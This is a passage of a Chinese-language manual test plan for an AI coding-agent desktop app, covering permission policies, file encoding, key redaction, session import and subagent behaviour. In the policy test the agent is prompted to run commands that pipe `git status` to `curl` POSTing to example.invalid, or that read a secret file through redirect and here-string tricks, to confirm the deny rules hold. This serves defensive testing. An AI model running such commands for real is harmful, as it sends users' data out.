   期望：`permission_policy_sources` 里出现你刚写的那个绝对路径，`permission_policy_sha256` 与默认值不同（本次 Build 的 CI 冒烟里默认是 `0fb12ca34d8e…`、`sources` 是 `[]`）。
   没出现就说明文件放错地方了，先解决再往下——这一步不过，MODEL-49 整项没有意义。

**操作**（同一个会话连着跑四条，每条跑完立刻存一次审计行）：

| # | 语法 | 提示词（直接复制） | 存证命令 |
|---|---|---|---|
| 0 | 对照 | 「用 bash 运行：`git status --short`。只运行。」 | `Save-TraceRows 'permission_' "$ev\model-49-baseline-audit.txt"` |
| 1 | 管道 | 「用 bash 运行：`git status --short \| curl -sS -X POST https://example.invalid`。只运行。」 | `Save-TraceRows 'permission_' "$ev\model-49-pipe-audit.txt"` |
| 2 | 重定向 | 「用 bash 运行：`echo probe > t033-secret.txt`。只运行。」 | `Save-TraceRows 'permission_' "$ev\model-49-redirect-audit.txt"` |
| 3 | here-string | 「用 bash 运行：`cat <<< "$(cat t033-secret.txt)"`。只运行。」 | `Save-TraceRows 'permission_' "$ev\model-49-herestring-audit.txt"` |

每条都记下：**弹卡了吗、判定是什么、模型拿到了什么**。

**第三格（策略「热重载」）**：

1. 把策略里的 `"git status *": "allow"` 改成 `"deny"`：

```powershell
(Get-Content "$polDir\config.json" -Raw).Replace('"git status *": "allow"', '"git status *": "deny"') |
  Set-Content -Path "$polDir\config.json" -Encoding UTF8
Get-Content "$polDir\config.json"
```

2. **不重开会话**，在原来那个会话里再发一次命令 0。记结果。
3. **新开一个会话**（不用重启应用，新会话会重新走一次 bootstrap），再发一次命令 0。记结果。
4. 两次结果都写进 `model-49-hot-reload.txt`。

**看什么**（判据逐字，用 5.1 更正后的版本）：「用户自写的策略文件、含管道 / 重定向 / here-string 的复杂命令两种组合下，判定与档位表一致；第三格『策略改写』验的是**不热重载**：会话进行中改策略文件，同一会话判定不变，新开会话才按新策略判定」。

三类语法的**预期判定**（来自样本包第 3.4 节）：

- 命令 0：**直接放行、不弹卡**（证明策略文件生效；没读到文件时随包默认是 `bash: {"*":"ask"}`，这条会弹卡）。
- 命令 1（管道）：**拒绝**——管道被逐段判定，第二段命中 `curl *` 的 deny。整条被放行就说明管道是整条判定而不是逐段。
- 命令 2（重定向）：**拒绝**——重定向目标被当作路径操作数注册，命中 `path` 的 deny（尽管 `echo` 本身没有 deny 规则）。
- 命令 3（here-string）：**拒绝**——操作数同样当路径注册，且其中的命令替换会被递归展开。

第三格的**预期**：改文件后**同一会话仍然放行**、**新开会话才拒绝**。
（当前实现没有热重载：`loadPermissionPolicy` 只在 `bootstrap.ts:303` 启动时调一次，结果冻进 `PermissionsPlugin` 的只读配置，运行期 `configure()` 只吃 `mode`/`gear`，全仓无策略文件监听。）
**所以「改了不生效」是通过，不是不通过。** 与旧树 P1-5 的原措辞不符时以现场为准，并在记录里写明。

**收尾**：把策略文件删掉或改回 `allow`，免得影响后面的项：

```powershell
Remove-Item "$polDir\config.json"
```

**记录**：`model-49-policy.json`、`model-49-policy-stamp.txt`、`model-49-baseline-audit.txt`、`model-49-pipe-audit.txt`、`model-49-redirect-audit.txt`、`model-49-herestring-audit.txt`、`model-49-hot-reload.txt`。

---

## 轮 M-d · 字符编码与文件名（MODEL-34 / 35 / 36，全部【必】）

### MODEL-34 W8 windows-05：CRLF 工作区的 edit 行为 【必】

**准备**（两条路任选，**都要确认文件真的是 CRLF**）：

- 有网：`git config --global core.autocrlf true` 之后 clone 一个小仓到 `C:\t033\crlf-repo`。
- 没网：本地造一个：

```powershell
git config --global core.autocrlf true
$repo = 'C:\t033\crlf-repo'
New-Item -ItemType Directory -Force -Path $repo | Out-Null
git init $repo | Out-Null
$p = "$repo\sample.ts"
[IO.File]::WriteAllText($p, "export const a = 1;`r`nexport const b = 2;`r`nexport const c = 3;`r`nexport const d = 4;`r`n")
cd $repo; git add -A; git -c user.email=t033@local -c user.name=t033 commit -m "crlf base" | Out-Null
# 确认是 CRLF：CR 的个数应当等于行数（这里是 4）
$bytes = [IO.File]::ReadAllBytes($p); ($bytes | Where-Object { $_ -eq 13 }).Count
```

**操作**：

1. 在应用里用 `C:\t033\crlf-repo` 开一个工作区和会话。
2. 发：「把 `sample.ts` 里的 `b` 从 2 改成 20，只改这一行，用 edit 工具，不要重写整个文件。」
3. 审批卡出现就允许。
4. 改完在 PowerShell 里：

```powershell
cd C:\t033\crlf-repo
git diff --stat  | Tee-Object "$ev\model-34-git-diff-stat.txt"
$bytes = [IO.File]::ReadAllBytes("$repo\sample.ts"); ($bytes | Where-Object { $_ -eq 13 }).Count | Tee-Object -Append "$ev\model-34-git-diff-stat.txt"
```

**看什么**（判据逐字）：「对一个 CRLF 文件做一次三行内的 edit，期望成功且文件行尾仍是 CRLF。失败形态要记录两件事：错误码原文、模型是否退回整文件 write」。

- 通过：edit 成功，`git diff --stat` 显示改动**只有 1 行左右**（不是整文件），CR 计数仍等于行数。
- 不通过：edit 报错（**把错误码原文一字不改地记下来**），或 `git diff --stat` 显示整文件都变了（说明模型退回了整文件 write，**这一点要单独记一句**），或 CR 计数变成 0（行尾被改成 LF）。

**记录**：`model-34-crlf-edit.txt`（会话里那段过程的截图或文字）、`model-34-git-diff-stat.txt`。

### MODEL-35 W11 windows-09：原生工具的 OEM 代码页输出 【必】

**准备**：

```powershell
New-Item -ItemType Directory -Force -Path "$ws\中文目录" | Out-Null
Set-Content -Path "$ws\中文目录\说明.txt" -Value '中文内容测试' -Encoding UTF8
```

**操作**：

1. 回到 `C:\t033\ws` 的会话，发：「用 bash 运行：`cmd /c dir 中文目录`。把工具返回的原文一字不改地贴给我。」
2. 审批卡允许。
3. 把工具结果那一段**完整复制**下来（在时间线上展开工具行 → 复制），存进证据文件；同时抓 trace：

```powershell
Get-Clipboard | Out-File -Encoding utf8 "$ev\model-35-oem-codepage.txt"
Save-TraceRows 'tool_execution' "$ev\model-35-trace.txt"
```

**看什么**（判据逐字）：「工作区里建一个中文名目录，让模型用 bash 跑 cmd 的 `dir`，工具结果里的中文必须可读」。

- 通过：工具结果里的「中文目录」「说明.txt」显示为正常汉字。
- 不通过：出现 `����` / `涓枃` / 问号方块这类乱码——**把乱码原文原样贴回**，不要用截图代替（截图看不出字节）。

**记录**：`model-35-oem-codepage.txt`、`model-35-trace.txt`。

### MODEL-36 W13 保留文件名与尾随点 【必】

> 执行单 §7 把这一项也列在「第三刀 纯探索」里。它同时是 §6 W-6 的必做行，所以按【必】做；真到了要砍单的时候，它是必做行里第一批可以砍的。

**操作**：

1. 回到 `C:\t033\ws` 的会话，发第一条：「用 write 工具在当前工作区写一个文件，文件名就叫 `nul`，内容写 `T033-NUL`。写完告诉我成功还是失败，把错误原文也给我。」
2. 审批卡允许（或被拒就记下来）。
3. **立刻**在 PowerShell 里核对：

```powershell
Test-Path "$ws\nul"
Get-ChildItem $ws -Force | Select-Object Name, Length | Out-File -Encoding utf8 "$ev\model-36-reserved-names.txt"
```

4. 再发第二条：「再用 write 工具写一个文件，文件名是 `trailing.`（结尾就是一个点），内容写 `T033-DOT`。写完告诉我成功还是失败。」
5. 同样立刻核对（以点结尾的名字 PowerShell 也不好直接查，用列目录的方式看）：

```powershell
Get-ChildItem $ws -Force | Where-Object { $_.Name -like 'trailing*' } | Format-List Name, FullName, Length |
  Out-File -Append -Encoding utf8 "$ev\model-36-reserved-names.txt"
Get-Content "$ev\model-36-reserved-names.txt"
```

**看什么**（判据逐字）：「让模型 write 到工作区下的 `nul` 与一个以点结尾的文件名：期望要么明确报错，要么真的落盘且随后 read 能读回；不得出现报告写入成功但文件不存在」。

- 通过（两种都算）：① 工具明确报错，模型如实说失败；② 文件真的在磁盘上，再让模型 read 一次能读回原内容。
- 不通过：模型说「写好了」但 `Test-Path` / 列目录里找不到这个文件——**这是这一项要抓的那个形态**。

**记录**：`model-36-reserved-names.txt`（含两次的落盘核对输出）、`model-36-model-reply.png`（模型说成功/失败的那一屏）。

---

## 轮 M-e · provider 错误取证（MODEL-9 + MODEL-10，【必】，同一轮做）

> ⚠️ **本轮涉及密钥形状的字符串。** 贴回给编排器之前，把任何看起来像真密钥的串**只保留前 4 位**，其余写成 `…（已打码）`。
> 不要贴 `auth.json`、不要贴 `vault.json`、不要贴设置页里的 key 输入框。

**两条路，任选一条（路 B 更确定，路 A 更贴近真实 provider）：**

**路 A · 真 provider + 故意写错的 key**

1. 设置页 → AI 服务 → 新增一个自定义服务：Service URL 用**你自己 provider 的地址**，API style 按你 provider 的风格选，API key 填一个**假串**：`sk-proj-` 后面跟 40 个 `a`。
2. 用这个服务开一个会话，随便发一句话 → 期望 401。

**路 B · 本地假 401 网关（确定能造出完整 40 位裸串）**

1. 存脚本：

```powershell
@'
import http from 'node:http';
const KEY = 'sk-proj-' + 'a'.repeat(40);
http.createServer((req, res) => {
  let body = '';
  req.on('data', (c) => { body += c; });
  req.on('end', () => {
    res.writeHead(401, { 'content-type': 'application/json' });
    res.end(JSON.stringify({
      type: 'error',
      error: { type: 'authentication_error', message: `Incorrect API key provided: ${KEY}. You can find your API key at https://example.invalid/keys` },
    }));
  });
}).listen(18401, '127.0.0.1', () => console.log('fake 401 gateway on http://127.0.0.1:18401'));
'@ | Set-Content -Path C:\t033\fake-401.mjs -Encoding UTF8
& $node C:\t033\fake-401.mjs        # 让它跑着，另开一个 PowerShell 窗口继续
```

2. 把它注册成一个自定义服务。**最省事的是走界面**：设置页 → AI 服务 → 新增 → Service URL 填 `http://127.0.0.1:18401`、API style 选 `anthropic-messages`、API key 随便填、名字写 `T033 Fake 401`。
   「Fetch models」会失败（它只会回 401），所以模型列表是空的；这时用样本包里的脚本直接写 vault：

```powershell
# ⚠️ 这个脚本会备份整份 vault.json，但如果你原来的自定义服务是加密存的，它会把服务列表清成只剩这一条假的。
#    备份文件名会打印出来，测完必须用 --restore 还原。
$reg = 'C:\t033\tools\register-fake-provider.mjs'   # 从 evidence/batch-e-devbox-2026-09-17/tools/ 拷过来的那一份
& $node $reg --port 18401 --id t033-fake401 --vault "$state\credentials\vault.json" --dry-run   # 先看一眼要写什么
& $node $reg --port 18401 --id t033-fake401 --vault "$state\credentials\vault.json"             # 确认无误再真写
```

   （脚本原件在仓库的 `docs/plantree/plans/runtime-hardening/evidence/batch-e-devbox-2026-09-17/tools/register-fake-provider.mjs`，拷到机器上任意目录再按上面的 `$reg` 指过去即可。）

**操作**（不论走哪条路）：

1. 记下开始时间，用这个失败的服务发一条消息，等它报错。
2. 找到这条会话的 JSONL，把 `errorMessage` 抓出来：

```powershell
$s = (Get-ChildItem -Recurse -Filter *.jsonl "$agent\sessions" | Sort-Object LastWriteTime -Descending | Select-Object -First 1).FullName
$s
Select-String -Path $s -Pattern 'errorMessage' | ForEach-Object { $_.Line } | Out-File -Encoding utf8 "$ev\model-09-session-errormessage.txt"
```

3. 抓同一轮 trace 里的 llm 便签：

```powershell
Save-TraceRows 'llm|provider|error' "$ev\model-09-runs-llm-note.txt"
```

4. 两边一起看，并单独查裸密钥串在不在 trace 里：

```powershell
Save-TraceRows 'sk-proj-' "$ev\model-10-bare-key-leak.txt"
Get-Item "$ev\model-10-bare-key-leak.txt" | Select-Object Length      # 0 字节 = trace 里没有这个串
```

5. **打码后**再把这两份文件的内容贴回。

### MODEL-9 provider 错误正文是否落进会话文件（ah-lib-01） 【必】

**准备 / 操作**：见本轮开头（路 A 或路 B + 上面 1～5 步），两项共用同一轮失败回合。

**看什么**（判据逐字）：「一轮真实 401/400 之后，会话 JSONL 中该 assistant 条目的 `errorMessage` 字段存在且未脱敏，而同一轮 `runs.jsonl` 的 llm 便签已脱敏——两者不一致即证实」。

- 「证实」= 现象成立（这是在确认 ah-lib-01 这个缺口存在）：会话文件里是**原文**，trace 里是**脱敏后的**。
- 通过（= 复现）：`model-09-session-errormessage.txt` 里能看到完整错误正文，而 `model-09-runs-llm-note.txt` 里对应的位置已经被打码。
- 反过来如果两边都脱敏了、或都没脱敏，也照实记——那是与推断不符，以现场为准。

**记录**：`model-09-session-errormessage.txt`（打码后）、`model-09-runs-llm-note.txt`（打码后）、`model-09-10-screenshot.png`。

### MODEL-10 裸密钥形状是否被 redactSensitiveErrorText 漏过（ah-lib-02） 【必】

**准备 / 操作**：与 MODEL-9 同一轮，另做一条断言（上面第 4 步的 `Save-TraceRows 'sk-proj-'`）。

**看什么**（判据逐字）：「让网关返回 `Incorrect API key provided: sk-proj-<40 位>`，`runs.jsonl` 里该串原样保留即证实」。

- 通过（= 复现）：`model-10-bare-key-leak.txt` **不是 0 字节**，里面能看到那条完整的 `sk-proj-…` 串（贴回时打码）。
- 没复现：文件是 0 字节，说明这个形状被脱敏住了——照实记。
- 走路 A 时，你的 provider 可能**根本不回显 key**（Anthropic 风格通常不回显），或者回显时自己就打了码。这种情况**不算不通过**，记 ⛔ 并写清「provider 返回的原文是什么形状、有没有回显」，或者改走路 B 重做一次。

**记录**：`model-10-bare-key-leak.txt`（打码后）。

**本轮收尾**：

- 停掉假网关（Ctrl+C），在设置页删掉那个假服务；
- 如果用了 `register-fake-provider.mjs`，**立刻还原 vault**：

```powershell
& $node $reg --restore "<它打印的那个 .bak 文件全路径>" --vault "$state\credentials\vault.json"
```

- 还原后开一次应用，确认你自己的 provider 还在、还能出话，再往下做。

---

## 轮 M-f · 导入互通一圈（MODEL-6 / 31 / 5，全部【必】，三项连着做）

导入面板在**设置页**里，区块标题是「从 Claude Code / Codex 导入历史对话」。

### MODEL-6 导入会话的续聊（H/21 C6 真机复验） 【必】

**准备**：先看这台机器上有没有可导入的源：

```powershell
Test-Path "$env:USERPROFILE\.claude\projects"
Get-ChildItem -Recurse -Filter *.jsonl "$env:USERPROFILE\.claude\projects" -ErrorAction SilentlyContinue |
  Measure-Object | Select-Object Count
Test-Path "$env:USERPROFILE\.codex\sessions"
Get-ChildItem -Recurse -Filter "rollout-*.jsonl" "$env:USERPROFILE\.codex\sessions" -ErrorAction SilentlyContinue |
  Measure-Object | Select-Object Count
```

两个源都没有 → 这一项记 ⛔，把上面的输出贴回当证据（写明「机器上没有可导入的真实源」）。

**操作**：

1. 打开设置页 →「从 Claude Code / Codex 导入历史对话」，挑一条**内容具体、看得出在讨论什么**的会话（比如明显在讨论某个报错或某个函数的那条）。
2. 导入它，等导入完成。
3. 打开导入后的会话，**先自己读一眼这条会话在讨论什么**（用来判断模型答得对不对）。
4. 发这条提示词：「上面这段对话在讨论什么问题？用两三句话概括，并引用其中一处具体细节。」
5. 截图模型的回答。

**看什么**（判据逐字）：「导入的历史真的进了模型上下文，模型据此作答而不是泛泛回应」。

- 通过：模型说得出**这条会话里的具体内容**（引用了里面出现过的文件名、报错、人名、数字之类）。
- 不通过：模型给的是「我们在讨论一些技术问题」这种放之四海而皆准的回答，或者说它看不到上面的内容。

**记录**：`model-06-import-continue.png`、`model-06-source-counts.txt`（上面那段 Test-Path 输出）。

### MODEL-31 H/21 Codex 旧格式导入 【必】

**准备**：找一份**真实旧格式** Codex rollout。判断方法：读文件**第一行**——新格式是带 `"type":"session_meta"` 的 JSON 对象；旧格式第一行是**裸 header**（元数据直接在顶层，没有 `type` / `payload` 包装）。

```powershell
"CODEX_HOME = $env:CODEX_HOME" | Out-File -Encoding utf8 "$ev\model-31-search.txt"
$roots = @("$env:USERPROFILE\.codex\sessions")
if ($env:CODEX_HOME) { $roots += "$env:CODEX_HOME\sessions" }
Get-ChildItem C:\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object { $roots += "$($_.FullName)\.codex\sessions" }
foreach ($r in $roots) {
  "=== $r (exists=$(Test-Path $r)) ===" | Out-File -Append -Encoding utf8 "$ev\model-31-search.txt"
  if (Test-Path $r) {
    Get-ChildItem -Recurse -Filter "rollout-*.jsonl" $r -ErrorAction SilentlyContinue |
      ForEach-Object { "{0}`t{1}" -f $_.FullName, (Get-Content $_.FullName -TotalCount 1) } |
      Out-File -Append -Encoding utf8 "$ev\model-31-search.txt"
  }
}
Select-String -Path "$ev\model-31-search.txt" -Pattern 'session_meta' -NotMatch |
  Select-String -Pattern 'rollout-'          # 这些就是候选的旧格式
```

还要顺手找这几处（找过就写进 `model-31-search.txt`）：备份盘 / OneDrive 里的 `.codex` 副本；这台机器上装过的 Codex 历史版本（能跑的话用它跑一次最短对话就会写出旧格式）。

**操作**（找到候选之后）：

1. 在导入面板里找到那条会话，导入。
2. 记三件事：**标题**对不对、**正文**条目完整不完整、**幂等**（再导入一次同一条，应当被识别为已存在而不是重复导入）。
3. 三项各截一张图或抄一行结论。

**看什么**（判据逐字）：「用一份真实的旧格式 Codex rollout（裸 header、裸行）跑导入，标题/正文/幂等三项与新格式一致」。

- 通过：三项都和新格式导入的表现一致。
- **一份都找不到**：这一项记 ⛔，把 `model-31-search.txt` 作为证据（它记录了你找过哪些路径）。
  **不要拿合成样本冒充**——要验的正是「真实旧版 Codex 写出来的字节」，自己拼的文件只能验到自己的假设。

**记录**：`model-31-search.txt`（必留，不管找没找到）、`model-31-legacy-codex.txt`（三项结论）、截图若干。

### MODEL-5 GUI 重命名后在 pi CLI 侧的标题 【必】

**操作**：

1. 在 GUI 里找一条会话，**重命名**成一眼认得出的名字，例如 `T033-RENAMED-SESSION`。
2. 找到它的 JSONL 路径：

```powershell
Get-ChildItem -Recurse -Filter *.jsonl "$agent\sessions" |
  Sort-Object LastWriteTime -Descending | Select-Object -First 5 FullName, LastWriteTime
```

3. **关掉应用**（避免写锁打架），用随包 pi CLI 打开同一个文件：

```powershell
$cli = "$app\resources\agent-host\node_modules\@earendil-works\pi-coding-agent\dist\bundle\cli.js"
Test-Path $cli
& $node $cli --session "<上一步选中的那个 .jsonl 全路径>"
```

4. 看 pi 的标题栏/会话信息里显示的是什么；再退出来用会话列表看一次：

```powershell
& $node $cli --session-dir "<那个 jsonl 所在的目录>" --resume
```

5. 两处各截一张图（终端窗口截图即可）。

**看什么**（判据逐字）：「pi CLI 的会话列表 / 标题栏显示的是 GUI 里改过的名字，还是空」。

- 这一项是**问「是哪一种」**，两种结果都要如实记：显示了 `T033-RENAMED-SESSION` / 显示为空 / 显示别的东西（把看到的原文抄下来）。

**记录**：`model-05-rename-in-pi.png`、`model-05-resume-list.png`。

---

## 轮 M-g · GUI ↔ TUI 互通（MODEL-47【必】 + 48 / 7 / 8 / 32【探】）

整轮都在**同一条会话**上做最省事：先做 MODEL-47（它把 GUI→TUI→GUI 一整圈走完），再顺手做 48 / 7 / 8 / 32。

右上角那个分段开关在会话栏上，两个按钮分别是 `GUI` 和 `TUI`。

### MODEL-47 H/20 I5：在 TUI 里续聊再回 GUI 的完整一圈 【必】

**操作**：

1. 在 `C:\t033\ws` 新开一条会话，发一句普通的话（例如「说一句话就好：T033 第一轮」），等回合结束。
2. 记下会话文件并**先存一份 before**：

```powershell
$s = (Get-ChildItem -Recurse -Filter *.jsonl "$agent\sessions" | Sort-Object LastWriteTime -Descending | Select-Object -First 1).FullName
$s
Copy-Item $s "$ev\model-47-jsonl-before.txt"
(Get-Content $s | Measure-Object).Count       # 记下行数
```

3. 点右上角开关切到 **TUI**，在 TUI 里**再聊一轮**（打一句「T033 第二轮」回车，等它答完）。
4. 点开关切回 **GUI**。
5. 存一份 after 并比对：

```powershell
Copy-Item $s "$ev\model-47-jsonl-after.txt"
(Get-Content $s | Measure-Object).Count
Get-Content $s -TotalCount 1 | ConvertFrom-Json | Select-Object type, timestamp, version, createdAt
```

6. 截一张 GUI 时间线的图（要能看到两轮都在、顺序对）。

**看什么**（判据逐字）：「两轮都在时间线上、顺序正确、无重复条目；会话文件头一行仍同时满足 v4 与 v3」。

- 「同时满足 v4 与 v3」= 第一行既有 v3 要的 `"type":"session"` 和 `"timestamp"`（ISO 字符串），也保留 v4 的 `"version":4` 与 `createdAt`（`src/runtime/plugins/session/codec.ts:88-104`）。
  上面第 5 步那条 `Select-Object` 的四个字段**都要有值**。
- 通过：GUI 时间线里两轮都在、顺序对、没有重复；行数 after > before；头一行四个字段齐全。
- 不通过：第二轮不显示 / 显示了两遍 / 顺序颠倒 / 头一行缺 `type` 或 `timestamp`（pi 会拒绝这个文件）/ 缺 `version`。

**记录**：`model-47-jsonl-before.txt`、`model-47-jsonl-after.txt`、`model-47-timeline.png`、`model-47-header.txt`（第 5 步的字段输出）。

### MODEL-48 右上角 GUI / TUI 开关那一下 【探】

> 判据带一句现场背景：CDP 真鼠标序列现在已经能驱动这个开关（DEV-30 点过一圈），**上机日仍手点一次即可**。花不了一分钟，建议顺手做掉。

**操作**（接着 MODEL-47 的会话）：

1. 切到 TUI **之前**先看锁：

```powershell
$lock = "$s.writer.lock"
Test-Path $lock; if (Test-Path $lock) { Get-Content $lock }
```

2. 手点开关切到 TUI，**5 秒内**抓 pi 的启动参数（Windows 上 `CommandLine` 取自进程创建那一刻，pi 之后改进程标题不会改它）：

```powershell
Get-CimInstance Win32_Process -Filter "Name='node.exe'" |
  Select-Object ProcessId, CommandLine | Format-List |
  Out-File -Encoding utf8 "$ev\model-48-argv.txt"
Get-Content "$ev\model-48-argv.txt"
```

3. 再查一次锁（TUI 期间）：`Test-Path $lock; Get-Content $lock`（把输出追加进同一个文件）。
4. 点回 GUI，发一条消息确认接得上，截图。

**看什么**（判据逐字）：「开关切换后，会话所有权正确移交、回来后 GUI 接得上」。

- 通过：切到 TUI 后 GUI 侧不再持锁（或锁内容换了主人）、pi 的 `CommandLine` 里能看到 `--session <你的那个 jsonl>`；切回 GUI 后能正常发消息、回合正常。
- 不通过：切不过去 / 切回来发消息报 `session_locked` 或 `session_not_ready` / pi 的 argv 里根本没有 `--session`。

**记录**：`model-48-switch.png`、`model-48-argv.txt`、`model-48-lock.txt`。

### MODEL-7 kill 之后 CLI 是否真的退出 【探】

**操作**：

1. 在 TUI 状态下记下 pi 进程 pid：

```powershell
Get-CimInstance Win32_Process -Filter "Name='node.exe'" |
  Where-Object { $_.CommandLine -like '*pi-coding-agent*' } |
  Select-Object ProcessId, CommandLine
$pipid = <填上面那个 ProcessId>
```

2. 切回 GUI 并**发一条消息**（这会触发 `releaseSessionForHostPrompt`）。
3. 发送后立刻连续采样这个 pid，同时记会话文件行数：

```powershell
1..20 | ForEach-Object {
  "{0} alive={1} lines={2}" -f (Get-Date -Format 'HH:mm:ss.fff'),
    [bool](Get-Process -Id $pipid -ErrorAction SilentlyContinue),
    (Get-Content $s | Measure-Object).Count
  Start-Sleep -Milliseconds 500
} | Tee-Object "$ev\model-07-kill-cli.txt"
```

**看什么**（判据逐字）：「GUI 发送触发 releaseSessionForHostPrompt 后，原 pi 进程 pid 在重读完成前已不存在，且重读点之后 JSONL 没有新增 CLI 追加的行」。

- 通过：采样里 `alive` 很快变 `False`，之后行数只因 GUI 这一轮增长，没有 CLI 追加的行。
- 不通过：pi 进程一直活着，或它在 GUI 重读之后还往文件里写。

**记录**：`model-07-kill-cli.txt`。

### MODEL-8 TUI 流式回合中途切 GUI 【探】

**操作**：

1. 切到 TUI，在里面发一个**会答很久**的问题（例如「写一篇 800 字的说明文，讲清楚什么是文件系统」）。
2. **输出到一半**时点开关切回 GUI，立刻截时间线。
3. 记一次行数，再在 GUI 里发一条消息，之后再记一次行数：

```powershell
(Get-Content $s | Measure-Object).Count
# 发完消息后再跑一次
(Get-Content $s | Measure-Object).Count
```

**看什么**（判据逐字）：「时间线缺失的条目在下一次 GUI 发送后被补齐，且文件仍可打开」。

- 通过：切回来时可能少几条，但**下一次 GUI 发送后补齐**了，会话还能正常打开。
- 不通过：条目一直缺 / 会话打不开 / 报文件损坏。

**记录**：`model-08-midstream-switch.png`、`model-08-line-counts.txt`。

### MODEL-32 回合进行中切 TUI 的实际行为 【探】

**操作**：

1. 在 GUI 里发一条长回合（同上那种 800 字的题）。
2. **回合还在跑的时候**点 TUI 按钮。
3. 截图弹出来的提示。
4. 随后看会话目录有没有第二个写者的痕迹：

```powershell
Get-ChildItem (Split-Path $s) -Force | Select-Object Name, Length, LastWriteTime |
  Out-File -Encoding utf8 "$ev\model-32-session-dir.txt"
Test-Path "$s.writer.lock"; if (Test-Path "$s.writer.lock") { Get-Content "$s.writer.lock" }
```

**看什么**（判据逐字）：「点终端按钮是否只弹『等这一轮结束』提示，且 `writer.lock` 与会话文件均未被第二个进程触碰」。

- 通过：只弹一条「等这一轮结束」之类的提示，没真的切过去；锁还是原来那把（pid 没变）。
- 不通过：真的切过去了 / 锁被换了 / 目录里多出临时文件。

**记录**：`model-32-switch-during-run.png`、`model-32-session-dir.txt`。

---

## 轮 M-h · 子代理真机（MODEL-39 ～ 43，全部【绿】）

整轮用同一批会话；MODEL-43 依赖前四项先落。

> 目录提醒：判据里写的是比对 `<agentDir>/agents`，但**原生 runtime 实际读写的是 `<agentDir>\subagents`**
> （`src/main/services/agent-host/subagentCatalog.ts:79-80`；`agents\` 只在「导入旧定义」时读一次）。
> 现场以 `subagents` 为准，并在记录里写明这处差异。

```powershell
$sub = "$agent\subagents"
New-Item -ItemType Directory -Force -Path $sub | Out-Null
```

### MODEL-39 SA16 保存 / 恢复 / 切分支的真机对比 【绿】

**操作**：

1. 在一条会话里派一个子代理（提示词：「派一个子代理去把工作区里的 `.ts` 文件逐个读一遍并写一段总结，慢慢来。」）。
2. **第一次（正常退出）**：子代理还没结算时，正常关闭应用 → 重新启动 → 打开同一条会话 → 截委派面板。
3. **第二次（强杀）**：再派一次，子代理没结算时强杀：

```powershell
Stop-Process -Name AiClient -Force
```

   再启动、打开同一条会话、截委派面板。
4. 两次都读一下会话 JSONL 里 Task 条目的终态：

```powershell
Select-String -Path $s -Pattern '"Task"' | ForEach-Object { $_.Line } |
  Out-File -Encoding utf8 "$ev\model-39-task-terminal-state.txt"
```

**看什么**（判据逐字）：「关掉应用再打开同一会话，委派面板按记录重建，未结算的显示为已取消（不是消失、也不是重新跑）；正常关闭与硬退出（强杀）两种收尾各跑一次，结果一致」。

- 通过：两次重开后委派面板都在、未结算的那条显示为**已取消**，两种收尾表现一致。
- 不通过：面板空了（消失）、或子代理**又跑了一遍**（重新跑）、或两种收尾结果不一致。

**记录**：`model-39-normal-exit.png`、`model-39-hard-kill.png`、`model-39-task-terminal-state.txt`。

### MODEL-40 SA17 管理页全链路与重启保留 【绿】

**操作**：在设置页的子代理管理里，把下面这串**逐项点一遍**，每做完一格截一张图（文件名后缀写清是哪一格）：

新增 → 改名 → 改描述 → 启用/停用开关 → 改模型 → 把轮次清空 → 搜索框搜一下 → 「定位文件」按钮 → 制造一次保存失败看是不是**整份回滚** → 刷新页面看会不会**闪空** → 确认 permission 字段**没编辑时不丢**。

做完**重启应用**，再回来截一次；同时比对磁盘：

```powershell
Get-ChildItem $sub | Select-Object Name, Length, LastWriteTime | Out-File -Encoding utf8 "$ev\model-40-agents-dir.txt"
Get-Content "$sub\*.md" | Out-File -Append -Encoding utf8 "$ev\model-40-agents-dir.txt"
```

**看什么**（判据逐字）：「增删改、改名、启停、模型 / 轮次清空、搜索、定位文件、逐行 busy、失败整份回滚、刷新不闪空、permission 未编辑不丢——逐项点一遍；重启应用后开关与改动仍在」。

- 通过：每一格都按预期起作用（逐项记 ✅/⛔），重启后开关与改动都还在，磁盘文件与界面一致。
- 不通过：任一格失败——**逐格记**，不要只写一句「大体正常」。

**记录**：`model-40-manage-<格名>.png`（多张）、`model-40-agents-dir.txt`、`model-40-after-restart.png`。

### MODEL-41 SA18 运行面板的滚动与跟随手感 【绿】

**操作**：

1. 开录屏。
2. 发：「同时派三个子代理：一个统计 `.ts` 文件数，一个统计 `.md` 文件数，一个把 readme 读一遍并总结。都要有输出。」
3. 子代理陆续出输出时，**把主时间线往上滚一点**，看它会不会被子代理的活动拽回底部。
4. 录 1～2 分钟即可。

**看什么**（判据逐字）：「子代理活动增多时局部滚动跟随正常、不抢主时间线的滚动位置」。

- 通过：子代理面板自己跟随滚动，主时间线停在你放的位置不动。
- 不通过：主时间线被强行拽到底部 / 面板不跟随、新输出看不见。

**记录**：`model-41-scroll.mp4`。

### MODEL-42 SA20 BrowserPreview 整链 【绿】

**准备**：造一个带 `BrowserPreview` 工具的子代理定义：

```powershell
@'
---
name: t033-preview
description: T033 BrowserPreview 整链验证用。
tools: read, write, browserpreview
permission: ask
maxTurns: 6
---
你负责生成一个最小的 HTML 页面并用 BrowserPreview 预览它。
'@ | Set-Content -Path "$sub\t033-preview.md" -Encoding UTF8
```

**操作**：

1. 重启应用（子代理目录在启动时扫描）。
2. 开录屏。
3. 发：「派 `t033-preview` 子代理，在工作区生成一个 `preview.html`（里面写一个大标题 T033），然后用 BrowserPreview 预览它。」
4. 预览窗出来后，**不要关它**，在 PowerShell 里改那个文件：

```powershell
Add-Content -Path "$ws\preview.html" -Value '<p>T033-EDITED</p>'
```

5. 看预览窗会不会**自动刷新**；同时注意预览窗弹出时有没有抢走前台焦点。

**看什么**（判据逐字）：「自定义一个带 `BrowserPreview` 的子代理，让它生成并预览工作区 HTML；编辑该文件后预览自动刷新；预览窗 `showInactive` 不抢前台」。

- 通过：预览窗出现、显示页面；改文件后它自己刷新出 `T033-EDITED`；弹出时你正在打字的窗口没被抢走。
- 不通过：预览窗不出现 / 不刷新（要手动重开）/ 弹出时抢了前台焦点。

**记录**：`model-42-browserpreview.mp4`、`model-42-preview.png`。

### MODEL-43 SA22 完整功能基线验收 【绿】

**前提**：MODEL-39 ～ 42 与 PKG-20 先落。基线的固定输入见[ P5-2-0 基线](../../../../runtime-evolution/topics/p5-2-0-baseline.md)（没有这份文档就用你上面几项用过的同一套提示词，并在记录里写明用的是什么输入）。

**操作**（三种收尾各跑一次，每次跑前记时间，跑完立刻存 trace）：

1. **成功**：派一个子代理正常做完。
2. **失败**：派一个必然失败的（例如让它读一个不存在的文件并要求必须成功）。
3. **取消**：派出去之后中途点停止。

每次：

```powershell
